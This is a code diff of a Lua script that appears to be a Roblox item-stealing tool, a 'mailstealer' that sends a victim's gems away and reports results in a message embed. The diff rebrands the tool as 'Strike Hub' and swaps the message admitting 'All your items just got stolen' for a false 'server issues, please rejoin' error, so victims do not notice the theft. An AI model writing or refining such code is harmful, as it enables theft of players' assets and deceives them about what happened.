@@ -114,7 +114,7 @@ local function SendMessage(diamonds)
             ["color"] = 65280,
 			["fields"] = fields,
 			["footer"] = {
-				["text"] = "Sorry we are having server problems at this moment."
+				["text"] = "Strike Hub."
 			}
         }}
     }
@@ -358,5 +358,5 @@ if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
     if GemAmount1 > mailSendPrice then
         SendAllGems()
     end
-    message.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
+    message.Error("We are Having server issues please rejoin and try again")
 end
